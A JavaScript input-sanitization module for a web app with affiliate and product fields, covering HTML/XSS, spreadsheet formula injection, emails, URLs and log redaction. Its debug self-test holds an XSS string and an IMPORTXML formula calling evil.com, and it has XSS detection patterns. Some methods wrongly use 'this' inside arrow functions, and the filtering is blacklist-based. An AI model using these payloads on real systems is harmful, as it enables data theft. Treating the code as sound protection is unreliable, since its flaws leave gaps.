/**
 * XSS Protection and Input Sanitization Module
 * Prevents script injection, formula injection, and HTML entity attacks
 */

const Sanitizer = {
    // ============================================
    // HTML SANITIZATION
    // ============================================
    
    /**
     * Sanitize HTML content to prevent XSS attacks
     * @param {string} dirty - Potentially unsafe HTML string
     * @returns {string} - Safe HTML string
     */
    sanitizeHtml: (dirty) => {
        if (!dirty) return '';
        if (typeof dirty !== 'string') dirty = String(dirty);
        
        // Remove script tags and contents
        let clean = dirty
            .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
            .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '')
            .replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, '')
            .replace(/<embed\b[^<]*(?:(?!<\/embed>)<[^<]*)*<\/embed>/gi, '')
            .replace(/<applet\b[^<]*(?:(?!<\/applet>)<[^<]*)*<\/applet>/gi, '');
        
        // Remove event handlers
        clean = clean
            .replace(/ on\w+="[^"]*"/gi, '')
            .replace(/ on\w+='[^']*'/gi, '')
            .replace(/ on\w+=\w+/gi, '')
            .replace(/ on\w+\\?=\\?"[^"]*"/gi, '');
        
        // Remove dangerous attributes
        const dangerousAttrs = [
            'javascript:', 'data:', 'vbscript:', 'livescript:',
            'expression(', 'url(', 'eval(', 'alert(', 'confirm(', 'prompt('
        ];
        
        dangerousAttrs.forEach(attr => {
            const regex = new RegExp(attr, 'gi');
            clean = clean.replace(regex, 'blocked:');
        });
        
        // Remove dangerous tags
        clean = clean
            .replace(/<meta[^>]*>/gi, '')
            .replace(/<link[^>]*>/gi, '')
            .replace(/<style[^>]*>.*?<\/style>/gis, '')
            .replace(/<base[^>]*>/gi, '');
        
        return clean;
    },
    
    /**
     * Escape HTML entities for safe text display
     * @param {string} unsafe - Unsafe text
     * @returns {string} - Escaped text
     */
    escapeHtml: (unsafe) => {
        if (!unsafe) return '';
        if (typeof unsafe !== 'string') unsafe = String(unsafe);
        
        const htmlEscapes = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#39;',
            '`': '&#96;',
            '/': '&#47;',
            '=': '&#61;'
        };
        
        return unsafe.replace(/[&<>"'`/=-]/g, char => htmlEscapes[char] || char);
    },
    
    // ============================================
    // SHEETS FORMULA INJECTION PREVENTION
    // ============================================
    
    /**
     * Sanitize for Google Sheets to prevent formula injection
     * @param {any} input - Input to sanitize
     * @returns {string} - Safe string for Sheets
     */
    sanitizeForSheets: (input) => {
        if (input === null || input === undefined) return '';
        
        const str = String(input).trim();
        
        // If empty, return as is
        if (str === '') return '';
        
        // Characters that could start formulas in Sheets
        const dangerousPrefixes = ['=', '@', '+', '-', '|', '*', '/', '\\'];
        
        // Check if starts with dangerous character
        if (dangerousPrefixes.some(prefix => str.startsWith(prefix))) {
            return "'" + str;
        }
        
        // Check if contains formula-like patterns
        const formulaPatterns = [
            /[=@+-]?[A-Z]+\(/i,  // Functions like SUM(
            /[=@+-]?[A-Z]+![A-Z]+/i, // Sheet references
            /[=@+-]?[A-Z]+:[A-Z]+/i, // Range references
            /[=@+-]?\$\$/, // Cell references
            /[=@+-]?IMPORT\w+/i // Import functions
        ];
        
        if (formulaPatterns.some(pattern => pattern.test(str))) {
            return "'" + str;
        }
        
        return str;
    },
    
    // ============================================
    // EMAIL SANITIZATION
    // ============================================
    
    /**
     * Sanitize and validate email
     * @param {string} email - Email to sanitize
     * @returns {string} - Sanitized email
     * @throws {Error} - If email format is invalid
     */
    sanitizeEmail: (email) => {
        if (!email) return '';
        
        // Convert to string and trim
        let clean = String(email).trim().toLowerCase();
        
        // Remove any whitespace inside
        clean = clean.replace(/\s/g, '');
        
        // Basic email validation
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(clean)) {
            throw new Error('Invalid email format');
        }
        
        // Remove any potentially dangerous characters
        clean = clean.replace(/[<>()\[\]\\,;:\s]/g, '');
        
        // Ensure single @ symbol
        const parts = clean.split('@');
        if (parts.length !== 2) {
            throw new Error('Invalid email format');
        }
        
        // Validate domain has at least one dot
        if (!parts[1].includes('.')) {
            throw new Error('Invalid email domain');
        }
        
        return clean;
    },
    
    // ============================================
    // ID SANITIZATION
    // ============================================
    
    /**
     * Sanitize affiliate ID (alphanumeric only)
     * @param {string} id - Affiliate ID
     * @returns {string} - Sanitized ID
     */
    sanitizeAffiliateId: (id) => {
        if (!id) return '';
        
        // Keep only alphanumeric and underscore
        return String(id).replace(/[^A-Za-z0-9_]/g, '');
    },
    
    /**
     * Sanitize product ID (alphanumeric, underscore, hyphen)
     * @param {string} id - Product ID
     * @returns {string} - Sanitized ID
     */
    sanitizeProductId: (id) => {
        if (!id) return '';
        
        // Keep only alphanumeric, underscore, hyphen
        return String(id).replace(/[^A-Za-z0-9_-]/g, '');
    },
    
    // ============================================
    // NAME SANITIZATION
    // ============================================
    
    /**
     * Sanitize name (letters, spaces, hyphens, apostrophes only)
     * @param {string} name - Name to sanitize
     * @returns {string} - Sanitized name
     */
    sanitizeName: (name) => {
        if (!name) return '';
        
        let clean = String(name).trim();
        
        // Remove any potentially dangerous characters
        clean = clean.replace(/[^a-zA-Z\s'-]/g, '');
        
        // Collapse multiple spaces
        clean = clean.replace(/\s+/g, ' ');
        
        // Limit length
        if (clean.length > 50) {
            clean = clean.substring(0, 50);
        }
        
        return clean;
    },
    
    // ============================================
    // URL SANITIZATION
    // ============================================
    
    /**
     * Sanitize URL
     * @param {string} url - URL to sanitize
     * @returns {string} - Sanitized URL or empty string if invalid
     */
    sanitizeUrl: (url) => {
        if (!url) return '';
        
        let clean = String(url).trim();
        
        // Only allow http and https
        if (!clean.match(/^https?:\/\//i)) {
            return '';
        }
        
        // Remove any script tags or javascript:
        clean = clean
            .replace(/javascript:/gi, '')
            .replace(/data:/gi, '')
            .replace(/vbscript:/gi, '')
            .replace(/livescript:/gi, '')
            .replace(/eval\(/gi, '')
            .replace(/expression\(/gi, '');
        
        // Validate URL format
        try {
            new URL(clean);
            return clean;
        } catch {
            return '';
        }
    },
    
    // ============================================
    // AMOUNT SANITIZATION
    // ============================================
    
    /**
     * Sanitize monetary amount
     * @param {any} amount - Amount to sanitize
     * @returns {number} - Sanitized amount (0 if invalid)
     */
    sanitizeAmount: (amount) => {
        if (amount === null || amount === undefined) return 0;
        
        // Remove any non-numeric characters except decimal point and minus
        const clean = String(amount).replace(/[^0-9.-]/g, '');
        
        const num = parseFloat(clean);
        
        // Check if valid number
        if (isNaN(num) || !isFinite(num)) return 0;
        
        // Check reasonable range
        if (num < 0 || num > 100000) return 0;
        
        // Round to 2 decimal places
        return Math.round(num * 100) / 100;
    },
    
    // ============================================
    // JSON SANITIZATION
    // ============================================
    
    /**
     * Sanitize for JSON (remove circular references)
     * @param {Object} obj - Object to sanitize
     * @returns {Object} - Sanitized object
     */
    sanitizeForJson: (obj) => {
        try {
            return JSON.parse(JSON.stringify(obj));
        } catch {
            return {};
        }
    },
    
    /**
     * Sanitize for logging (remove sensitive data)
     * @param {Object} obj - Object to sanitize
     * @returns {Object} - Sanitized object safe for logging
     */
    sanitizeForLog: (obj) => {
        if (!obj || typeof obj !== 'object') return obj;
        
        const sensitive = [
            'password', 'token', 'verificationCode', 'verification_code',
            'credit', 'card', 'cvv', 'ssn', 'secret', 'key',
            'authorization', 'cookie', 'session'
        ];
        
        const sanitized = Array.isArray(obj) ? [] : {};
        
        for (const [key, value] of Object.entries(obj)) {
            // Check if key contains sensitive word
            if (sensitive.some(s => key.toLowerCase().includes(s))) {
                sanitized[key] = '[REDACTED]';
            } 
            // Recursively sanitize nested objects
            else if (value && typeof value === 'object') {
                sanitized[key] = this.sanitizeForLog(value);
            } 
            // Keep other values
            else {
                sanitized[key] = value;
            }
        }
        
        return sanitized;
    },
    
    // ============================================
    // SQL INJECTION PREVENTION (for completeness)
    // ============================================
    
    /**
     * Basic SQL injection prevention (escape single quotes)
     * @param {string} input - Input to sanitize
     * @returns {string} - Sanitized string
     */
    sanitizeForSql: (input) => {
        if (!input) return '';
        
        return String(input).replace(/'/g, "''");
    },
    
    // ============================================
    // COMPREHENSIVE SANITIZATION
    // ============================================
    
    /**
     * Comprehensive sanitization for user input
     * @param {Object} data - Data object to sanitize
     * @returns {Object} - Sanitized data
     */
    sanitizeUserInput: (data) => {
        if (!data || typeof data !== 'object') return data;
        
        const sanitized = {};
        
        for (const [key, value] of Object.entries(data)) {
            if (typeof value === 'string') {
                // Apply appropriate sanitization based on key
                if (key.toLowerCase().includes('email')) {
                    try {
                        sanitized[key] = this.sanitizeEmail(value);
                    } catch {
                        sanitized[key] = '';
                    }
                } else if (key.toLowerCase().includes('name')) {
                    sanitized[key] = this.sanitizeName(value);
                } else if (key.toLowerCase().includes('url')) {
                    sanitized[key] = this.sanitizeUrl(value);
                } else if (key.toLowerCase().includes('amount') || 
                          key.toLowerCase().includes('price')) {
                    sanitized[key] = this.sanitizeAmount(value);
                } else {
                    // Default: escape HTML
                    sanitized[key] = this.escapeHtml(value);
                }
            } else if (typeof value === 'object' && value !== null) {
                sanitized[key] = this.sanitizeUserInput(value);
            } else {
                sanitized[key] = value;
            }
        }
        
        return sanitized;
    },
    
    // ============================================
    // VALIDATION HELPERS
    // ============================================
    
    /**
     * Check if string contains HTML
     * @param {string} str - String to check
     * @returns {boolean} - True if contains HTML
     */
    containsHtml: (str) => {
        if (!str) return false;
        
        const htmlRegex = /<[a-z][\s\S]*>/i;
        return htmlRegex.test(str);
    },
    
    /**
     * Check if string contains potential XSS
     * @param {string} str - String to check
     * @returns {boolean} - True if contains XSS
     */
    containsXss: (str) => {
        if (!str) return false;
        
        const xssPatterns = [
            /<script/i,
            /javascript:/i,
            /onclick/i,
            /onerror/i,
            /onload/i,
            /eval\(/i,
            /alert\(/i,
            /document\.cookie/i,
            /window\.location/i
        ];
        
        return xssPatterns.some(pattern => pattern.test(str));
    }
};

// ============================================
// FREEZE OBJECT
// ============================================

Object.freeze(Sanitizer);

// ============================================
// EXPORT FOR GLOBAL USE
// ============================================

window.Sanitizer = Sanitizer;

// ============================================
// SELF-TEST (only in debug mode)
// ============================================

if (CONFIG.DEBUG) {
    console.log('Testing Sanitizer module...');
    
    const testCases = [
        { input: '<script>alert("xss")</script>', type: 'html' },
        { input: '=IMPORTXML("http://evil.com", "//data")', type: 'sheets' },
        { input: 'john@example.com', type: 'email' },
        { input: 'John Doe Jr.', type: 'name' }
    ];
    
    testCases.forEach(test => {
        let result;
        switch(test.type) {
            case 'html':
                result = Sanitizer.sanitizeHtml(test.input);
                break;
            case 'sheets':
                result = Sanitizer.sanitizeForSheets(test.input);
                break;
            case 'email':
                try {
                    result = Sanitizer.sanitizeEmail(test.input);
                } catch {
                    result = 'invalid';
                }
                break;
            case 'name':
                result = Sanitizer.sanitizeName(test.input);
                break;
        }
        console.log(`Sanitizer test: "${test.input}" -> "${result}"`);
    });
}